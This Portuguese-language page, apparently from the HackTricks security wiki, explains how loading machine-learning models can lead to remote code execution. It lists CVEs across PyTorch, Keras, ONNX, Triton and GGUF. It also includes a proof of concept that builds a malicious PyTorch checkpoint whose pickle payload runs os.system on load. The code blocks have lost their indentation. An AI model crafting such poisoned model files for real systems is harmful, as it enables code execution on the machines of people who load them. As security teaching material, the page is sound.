# Models RCE

{{#include ../banners/hacktricks-training.md}}

## Carregando modelos para RCE

Modelos de Machine Learning são geralmente compartilhados em diferentes formatos, como ONNX, TensorFlow, PyTorch, etc. Esses modelos podem ser carregados nas máquinas dos desenvolvedores ou em sistemas de produção para serem utilizados. Normalmente, os modelos não devem conter código malicioso, mas há alguns casos em que o modelo pode ser usado para executar código arbitrário no sistema como uma funcionalidade pretendida ou devido a uma vulnerabilidade na biblioteca de carregamento do modelo.

No momento da escrita, estes são alguns exemplos desse tipo de vulnerabilidades:

| **Framework / Ferramenta**  | **Vulnerabilidade (CVE se disponível)**                                                                                     | **Vetor RCE**                                                                                                                         | **Referências**                               |
|------------------------------|------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Desserialização insegura em* `torch.load` **(CVE-2025-32434)**                                                            | Pickle malicioso no ponto de verificação do modelo leva à execução de código (contornando a proteção `weights_only`)                    | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                        | SSRF + download de modelo malicioso causa execução de código; RCE de desserialização Java na API de gerenciamento                       | |
| **TensorFlow/Keras**        | **CVE-2021-37678** (YAML inseguro) <br> **CVE-2024-3660** (Keras Lambda)                                                   | Carregar modelo de YAML usa `yaml.unsafe_load` (execução de código) <br> Carregar modelo com camada **Lambda** executa código Python arbitrário | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (análise TFLite)                                                                                         | Modelo `.tflite` elaborado provoca estouro de inteiro → corrupção de heap (potencial RCE)                                             | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                          | Carregar um modelo via `joblib.load` executa pickle com o payload `__reduce__` do atacante                                             | |
| **NumPy** (Python)          | **CVE-2019-6446** (inseguro `np.load`) *disputado*                                                                         | `numpy.load` padrão permitia arrays de objetos pickle – `.npy/.npz` malicioso provoca execução de código                                | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (traversal de diretório) <br> **CVE-2024-5187** (traversal tar)                                         | O caminho de pesos externos do modelo ONNX pode escapar do diretório (ler arquivos arbitrários) <br> Modelo ONNX malicioso tar pode sobrescrever arquivos arbitrários (levando a RCE) | |
| ONNX Runtime (risco de design) | *(Sem CVE)* operações personalizadas ONNX / fluxo de controle                                                               | Modelo com operador personalizado requer carregamento do código nativo do atacante; gráficos de modelo complexos abusam da lógica para executar cálculos não intencionais | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (traversal de caminho)                                                                                   | Usar a API de carregamento de modelo com `--model-control` habilitado permite traversal de caminho relativo para escrever arquivos (por exemplo, sobrescrever `.bashrc` para RCE) | |
| **GGML (formato GGUF)**     | **CVE-2024-25664 … 25668** (múltiplos estouros de heap)                                                                     | Arquivo de modelo GGUF malformado causa estouros de buffer de heap no parser, permitindo execução de código arbitrário no sistema da vítima | |
| **Keras (formatos antigos)** | *(Sem nova CVE)* Modelo Keras H5 legado                                                                                     | Modelo HDF5 malicioso (`.h5`) com código de camada Lambda ainda executa ao carregar (modo seguro do Keras não cobre formato antigo – “ataque de downgrade”) | |
| **Outros** (geral)          | *Falha de design* – Serialização Pickle                                                                                     | Muitas ferramentas de ML (por exemplo, formatos de modelo baseados em pickle, `pickle.load` do Python) executarão código arbitrário embutido em arquivos de modelo, a menos que mitigado | |

Além disso, existem alguns modelos baseados em pickle do Python, como os usados pelo [PyTorch](https://github.com/pytorch/pytorch/security), que podem ser usados para executar código arbitrário no sistema se não forem carregados com `weights_only=True`. Portanto, qualquer modelo baseado em pickle pode ser especialmente suscetível a esse tipo de ataque, mesmo que não esteja listado na tabela acima.

Exemplo:

- Crie o modelo:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- Carregue o modelo:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
{{#include ../banners/hacktricks-training.md}}
